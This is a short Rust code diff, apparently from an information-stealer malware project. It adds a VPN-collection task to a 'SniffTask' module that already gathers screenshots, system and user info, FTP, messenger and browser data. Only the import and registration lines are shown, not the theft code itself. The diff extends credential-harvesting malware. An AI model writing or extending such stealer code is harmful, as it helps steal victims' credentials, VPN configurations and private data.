@@ -14,6 +14,7 @@ use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use crate::userinfo::UserInfoTask;
 use alloc::vec;
+use vpn::VpnTask;
 use browsers::BrowsersTask;
 use ftp::FtpTask;
 use messengers::MessengersTask;
@@ -34,6 +35,7 @@ impl SniffTask {
                 UserInfoTask,
                 FtpTask::new(),
                 MessengersTask::new(),
+                VpnTask::new(),
                 BrowsersTask::new(),
             )
         }
